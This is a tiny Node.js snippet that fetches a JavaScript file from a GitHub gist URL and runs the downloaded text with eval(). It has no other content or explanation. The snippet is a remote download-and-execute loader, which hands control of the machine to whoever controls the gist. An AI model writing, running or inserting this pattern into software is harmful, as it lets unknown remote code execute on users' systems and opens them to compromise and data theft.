const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/19fb0fdedea97cd890bccf619a7500c71bd77f86/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
